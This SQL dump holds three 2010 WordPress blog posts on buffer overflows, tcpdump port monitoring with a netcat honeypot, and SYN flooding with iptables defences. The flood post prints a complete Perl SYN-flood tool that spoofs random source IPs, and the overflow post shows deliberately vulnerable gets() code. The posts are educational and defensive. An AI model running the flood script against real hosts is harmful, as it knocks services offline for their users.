'38','1','open','http://www.interwebz.us/wordpress/?p=38','0','open','','2','As I was writing the last post regarding spam, I got to thinking about some of the other questions I\'m frequently asked.  I think the second most frequent has got to be regarding how hacking actually <em>works</em>.\n\nSo, I\'m sitting here on my patio in the beautiful sun throwing the frisbee for my dog and decided what a perfect time to go in to a little detail about the science behind a \"hack\".\n\nThere are two forms of a \"hack\".  Originally, a \"hack\" referred to manipulating something to get it to do something it wasn\'t intended to.  This was a more innocent time, when it was more about ingenuity and thinking outside the box to pull pranks and impress your professor.\n<!--more-->\n\nToday\'s version of hacking follows the same concept, but the desired outcome is a bit different.  Rather than figuring out a way to hack a vending machine to give up it\'s goods for free, today the idea is to exploit flaws in software in an attempt to escalate privileges.  To understand how this is accomplished, you need to understand operating systems and permissions.  I\'ll be using Linux as the example, but it applies to any multiuser operating system out there.\n\nIn the Linux world, the administrative account is named \"root\".  A hackers goal, ultimately, is to become root on a system that he or she doesn\'t have, or has limited access to.  There are a number of ways to accomplish this, but generally the method used is called \"stack smashing\", also known as a \"buffer overflow.\"  There are about a million other ways, but stack smashing is one of the originals.\n\nThere was a document written long, long ago by a guy named AlephOne called \"<a href=\"http://www.google.com/url?sa=t&source=web&ct=res&cd=1&ved=0CAcQFjAA&url=http%3A%2F%2Finst.eecs.berkeley.edu%2F~cs161%2Ffa08%2Fpapers%2Fstack_smashing.pdf&rct=j&q=smashing+the+stack+for+fun+and+profit+pdf&ei=LY6jS-eQLouVtgfW_7SOCg&usg=AFQjCNGFLW6iO9Sw1l38x6D8Bry_U75DXA\">Smashing the Stack for Fun and Profit</a>.\"  That document goes into far more detail than what I\'ll get into here, but if this at all interests you, I highly recommend reading that.\n\nLets take a simple C program that takes user input and copies it into a buffer.\n\n<pre>\n#include <stdio.h>\nmain() {\n     char buf[10];\n     printf(\"Enter your name: \");\n     gets(buf);\n}\n</pre>\n\nSo, running this will simply ask for your name and the supplied string is copied into \'buf\', which has been defined to allocate 10 bytes of data specifically to hold the whatever it is that is entered.  No big deal.\n\nLets say, though, that the user has a name that\'s 20 characters long.  Given that the program has only allocated 10 bytes of memory space, we run into a problem.  This is called a \"buffer overflow\", because the data has overflowed the bounds of the buffer.  Here\'s what that looks like:\n\n<blockquote>\n<pre>\n$ ./vulnerable\nEnter your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nSegmentation fault\n</pre>\n</blockquote>\n\nAs you can see, the program crashed.  When run through a debugger, you can analyse the memory addresses that are being overwritten by the additional data.  Specifically, you\'re looking for the instruction \"RET\" to be overwritten with 0x41414141 (a string of A\'s).  If you\'re able to overwrite RET, you can then change the return address of a function to point to an address outside of the process space to execute arbitrary code.\n\nNow, lets say that the program that is vulnerable to this style of attack is suid root, meaning, that the program has root privileges when its run because it needs access to something that only root would have access to.  Files, directories, sockets, etc.\n\nAfter the overflow takes place, the arbitrary code that is injected will be a set of instructions to do one of the following (in most cases).  Again, these instructions will be executed as \'root\'.\n \n	<li>Copy /bin/sh somewhere and set the suid bit</li>\n<li>Copy /bin/sh somewhere and set the suid bit and bind it to a port for remote access</li>\n\nThen, when the attacker executes /bin/sh, he will now be operating within a root shell and will have become the super user, having complete and utter control over the system to do whatever he pleases.\n\nToday\'s Unix based systems have implemented better libraries to help prevent this style of attack by randomizing the memory addresses that are being used when a program is executed, making it more difficult to determine the needed memory addresses used to pull off this style of attack, and also makes it necessary to write code for individual systems.  However, there are ways of bypassing these measures and someone determined enough will figure it out.  Though, because of these security measures, the script kids have gone on to other types of \"hacks\", if you can even call them that.\n\nThe entire problem with stack smashing spawned from really, really bad code being written.  What fueled this problem was that the bad code made it into college text books, which were then taught to the next generation of programmers.  There are a number of C functions which were vulnerable to buffer overflow attacks, because they didn\'t incorporate bounds checking.  IE - lets make sure the buffer is large enough to hold the amount of data that we\'re about to send it.  New functions that DID incorporate bounds checking were introduced long after this problem was running rampant, but even without these new functions, writing secure code was only a matter of coming up with an additional line of code and manually doing the bounds checking by incorporating <code>sizeof()</code> before passing user supplied data to a buffer.\n\nThis has really been a simplified version of the whole buffer overflow science, but if you\'re interested in how this works and how it\'s been used, there are many resources on the interwebz describing it.\n\n','','2010-03-19 10:24:42','2010-03-19 15:24:42','','','2010-03-19 10:24:42','2010-03-19 15:24:42','a-stack-smashing-good-time','0','','publish','A Stack Smashing Good Time','post',''),(
'46','1','open','http://www.interwebz.us/wordpress/?p=46','0','open','','2','I monitor my network heavily, probably beyond what is necessary, and I like to see what\'s going on behind the scenes.  I have sniffers set up, iptable logging, snort, etc etc etc.. but those only watch ports that are open that I\'m expecting to receive data on.  But, what I find interesting, is everything <i>else</i> that is being sent in and out of my network.\n\nSo, I run tcpdump on both the internal and external interface of my firewall.  This is done simply by:\n<!--more-->\n<blockquote>\ntcpdump -i eth0 -n -w tcpdump.eth0.3.19.2010.log \'tcp[13] & 2 != 0\'\n</blockquote>\nand\n<blockquote>\ntcpdump -i eth1 -n -w tcpdump.eth1.3.19.2010.log \'tcp[13] & 2 != 0\'\n</blockquote>\n\nThis simply monitors both interfaces for SYN packets, because I don\'t really want, or need, any other packets because my firewall wont respond to any packets sent to ports that are closed.\n\nThen, to find out what type of activity is going on beyond that of what I\'m expecting so see, I\'ll run something like this:\n\n<blockquote>\nfirewall# tcpdump -n -r tcpdump.eth1.3.19.2010.log \'tcp[13] & 2 != 0\' and not src net my.ip.add.ress and not src port 8200 and not src port 443 and not src port 445 and not src port 25 and not src port 80|perl -le \'sub order(){$p{$b}<=>$p{$a};}while(<STDIN>){if(/^.*?my.ip.add.ress.(d+).*/){$p{$1}++;}}foreach $port(sort order(keys(%p))){print \"$port - hits: $p{$port}\";}\'|more\n\nreading from file tcpdump.eth1.3.19.2010.log, link-type EN10MB (Ethernet)\ntcpdump: pcap_loop: truncated dump file; tried to read 62 captured bytes, only got 20\n25 - hits: 865\n10392 - hits: 73\n445 - hits: 69\n53 - hits: 61\n135 - hits: 47\n22 - hits: 28\n5900 - hits: 17\n3246 - hits: 16\n.......\n</blockquote>\n\nWhat this tells me is each port that is being hit and how many times.  Port 25 is a given, I run a mail server.. but port 10392 is interesting.  Investigating further, it shows me that all the sources hitting this port are Japanese.  Neat.  Also, there doesn\'t seem to be any information on the internet about what this port is, does, anything.. so, we\'ll have to figure it out on our own.\n\nSo, now what I want to know, is what, exactly, they\'re trying to accomplish by connecting to that port.  This is where a honeypot comes in handy.  It doesn\'t have to be anything too elaborate, because I don\'t really want to interact with them, I just want to understand what they\'re trying to connect to, so \'netcat\' will be all that I need.\n\nIn my firewall, I add the following line:\n\n<blockquote>\niptables -A INPUT -p tcp -i eth1 -d 0/0 -s 0/0 --destination-port 10392 -j accepted\n</blockquote>\n\nIf you want to redirect traffic to a different box, you can do something like this:\n\n<blockquote>\niptables -t nat -A PREROUTING -p tcp -i eth1 --dport 10392 -j DNAT --to 192.168.0.x:10392 -m comment --comment \"HoneyPot\"\niptables -A FORWARD -p tcp -i eth1 -d 192.168.0.x --destination-port 10392 -j accepted -m comment --comment \"HoneyPot\"\niptables -A FORWARD -p tcp -i eth0 -s 192.168.0.x --source-port 10392 -j accepted -m comment --comment \"HoneyPot\"\n</blockquote>\n\nOnce you have iptables set up, you\'ll need to run netcat to listen on port 10392.  Here\'s the command line that I use:\n\n<blockquote>\nperl -le \'while($i <= \"100\") { system(\"nc -l -v -p 10392\"); $i++; }\' &> nc-10392.log&\n</blockquote>\n\nThis takes 100 samples and then exits, because I doubt I\'ll need any more than 100 samples to understand what exactly is going on.  In reality, I probably really only need 2 or 3, but, whatever.  You have to do it this way because netcat exists after a successful connect, so you need to reinvoke it.\n\nOn a side note, the \'-k\' supposedly sets the keep-alive option on the socket, but it doesn\'t seem to work.. so.\n\nAnd, now you wait.  And wait.. and wait some more.  It seems that as soon as you run something like this, all interest is lost in the port and you have to wait for days before you see any activity on it again, which is why I\'m not going to tell you what I found going on with this port just yet.  ;-)\n\nAs soon as I find out, I\'ll be posting an update.  If it\'s interesting enough, I\'ll also be posting it to SANS ISC.\n\nBecause I\'m sure most of you find that absurdly long command line that I pasted above to be a bit confusing, I wrote a simple script to accomplish the same thing, but in an easier to read format.\n\n<pre lang=\"perl\" line=\"1\">\n#!/usr/bin/perl\nuse Socket;\n\n# The following 3 lines should actually be just 1.  Hooray for wordwrap.\nopen(F, \"tcpdump -i eth1 -n -r /usr/local/bin/firewall/tcpdump.eth1.3.19.2010.log \n\'tcp[13] & 2 != 0\' and not src net your.ip.add.ress and not src port 8200 and not \nsrc port 443 and not src port 445 and not src port 25 and not src port 80|\") || die \"$!\";\n\nsub order() {\n  $p{$b} <=> $p{$a};\n}\n\nsub service() {\n  my ($port) = @_;\n  \n  $service = getservbyport(\"$port\", tcp);\n  if($service eq \"\") { $service = \"Unknown\"; }\n  return($service);\n}\n\nwhile(<F>) {\n  if(/^.*?your.ip.address.(d+).*/) {\n    $p{$1}++;\n  }\n}\n\nforeach $port(sort order(keys(%p))) {\n  print \"PORT: $port HITS: $p{$port} DESC: \", &service($port), \"n\";\n}\n</pre>','','2010-03-20 20:05:02','2010-03-21 01:05:02','','','2010-03-20 20:05:02','2010-03-21 01:05:02','port-activity-and-honeypots','0','','publish','Port Activity and HoneyPots','post',''),(
'56','0','open','http://www.interwebz.us/wordpress/?p=56','0','open','','2','So, as I stated in my bio, I love playing with and abusing network protocols.  Tonight I was going through some of my old scripts and came across one of my old favourites, \'synk\'.\n\nI\'ve written synk in a few different languages, with various different versions, but all based on the same concept.  TCP+SYN flooding.  Some versions had random source IP\'s set per packet, others had singular spoofed source IP, others used random ports, port ranges, random tcp flags set, offsets, etc etc etc, but always the most effective one was the one that used random source IP\'s set per packet, hitting a range of destination ports.\n<!--more-->\nI decided to play with it again tonight to slam my network (hard) and, to my surprise, it still works as effectively as it once did.  I really couldn\'t believe it.  Especially against the firewall that I have set up, I never expected it to do anything.\n\nWell, I was wrong.  I typed in the command and boom, service went down almost as fast as I hit \"enter\".  Even a robust service, like Sendmail.  This was a little upsetting, because I even had a rule in my firewall to block syn floods.  I also have syn-cookies enabled on the server running Sendmail.\n\nI started digging and doing some research on A) why my rule didn\'t work properly, and B) how to write a rule that would.  I came across a lot of blog entries and forums all listing a rule similar to what I had, so I\'m guessing these people have never tested their rule properly.\n\nHere\'s the code that I used to carry out the attack.  Keep in mind, this was written years and years ago.\n\n<pre>\n#!/usr/bin/perl\n\nrequire \'getopts.pl\';\n\n### need to utilize raw sockets.\nuse Net::RawIP;\nGetopts(\'s:t:p:n:\');\n\n\n### function to create random IP\'s.  Don\'t bother using this if you\'re using\n### an ISP not located in a 3rd world country.  Most (all?) ISP\'s utilize\n### egress filtering which prevents spoofing.  That said... you could tweak\n### this to only use IP\'s from the /24 that your IP resides in and stand a \n### better chance of the spoofed packet making it through.  It depends \n### on how the filtering is set up at your ISP.\nsub randip () {\n  $ip = join(\".\", map int rand 256, 1 .. 4);\n  return(\"$ip\");\n}\n\n### set up the socket.\n$syn = new Net::RawIP;\n\ndie \"Usage: $0 -s <source ip> -t <target> -p <port> -n <number of packets>n\"\nunless ($opt_s && $opt_t && $opt_p && $opt_n);\n\n### allow the user to specify a list of comma separated ports via the command line.\n@ports = split(/,/, $opt_p);\n$list = @ports;\n\n### super awesome output.\nprint \"Hitting $opt_t on port(s) @ports with $opt_n packets originating from $opt_s....n\";\n\n### start the loop\nfor($i = 1;$i < $opt_n;$i++) {\n  ### randomly select a port out of the @ports array\n  $nlist = int rand($list);\n  $dport = $ports[$nlist];\n\n  ### Souce ports must be random\n  $rport = int rand(65535);\n\n  ### set up the packet.. \n  $syn->set({\n      ip => {\n             daddr => $opt_t,\n             saddr => $opt_s,\n            },\n\n  ### specify the destination port and source port.. make sure the syn flag is enabled.\n      tcp => {\n              dest => $dport,\n              source => $rport,\n              ack => 0,\n              urg => 0,\n              rst => 0,\n              fin => 0,\n              psh => 0,\n              syn => 1 \n             }\n      });\n  ### send the packet! yay!      \n      $syn->send;\n}\n</pre>\n\nSeems too simple to believe that code similar to that once took down Yahoo, eTrade, and many other huge internet companies.\n\nMy original iptables rule for handling synfloods looked like this:\n\n<blockquote>\n<pre>\niptables -A INPUT -m state --state NEW -p tcp -m tcp --syn -m recent  \n              --name synflood --set\niptables -A INPUT -m state --state NEW -p tcp -m tcp --syn -m recent \n              --name synflood --update --seconds 5 --hitcount 10 -j synflood \n              -m comment --comment \"Synflood\"\niptables -A FORWARD -m state --state NEW -p tcp -m tcp --syn -m recent \n              --name synflood --set\niptables -A FORWARD -m state --state NEW -p tcp -m tcp --syn -m recent\n               --name synflood --update --seconds 5 --hitcount 10 -j synflood \n               -m comment --comment \"Synflood\"\n</pre>\n</blockquote>\n\nHere\'s the new rule I came up with that <i>DOES</i> work.  It also has the additional benefit of limiting how many connections a single IP can have to a service, which is effective for those SSH brute force worms and various other internet annoyances.  I would be a little more liberal on the amount of connections when using it to protect an HTTP service, though.  I would probably change <code>connlimit-above 3</code> to something like, <code>connlimit-above 8</code>, as clients generally make more than 3 connections to a server when requesting a web page.\n\n<blockquote>\n<pre>\niptables -A FORWARD -p tcp --syn --dport 25 -m connlimit --connlimit-above 3 \n              --connlimit-mask 24 -j synflood -m comment --comment \"SMTP Synflood Protection\"\n</pre>\n</blockquote>\n\nThe other beautiful thing about this rule, is that it limits the entire class C, and it\'s not permanent.  So, if one disconnects, it\'s immediately available for another connection from that netblock.\n\nThere is, however, one caveat that I\'m not sure if there\'s a way to protect against, and that\'s the random source IP\'s set on a per packet basis.  \n\nIE, packet one may come from 1.2.3.4 and packet two could be from 72.72.72.72 and packet three could be from 81.81.81.81, and so on, times millions of packets.  \n\nThere is a way to write a rule to monitor the flow of syn packets and recognize a synflood, but then it kind of defeats the purpose because it shuts down access to the port for everyone, which is essentially the desired outcome of the attacker in the first place.  The system being attacked wont suffer from the CPU overhead of a synflood, and recovery will be quicker, but so long as the attack is taking place, the services are unavailable.  Anyone care to comment on this?\n','','2010-03-21 04:05:11','2010-03-21 09:05:11','','','2010-03-21 04:05:11','2010-03-21 09:05:11','synflooding-and-iptables','0','','publish','Synflooding and iptables','post','');
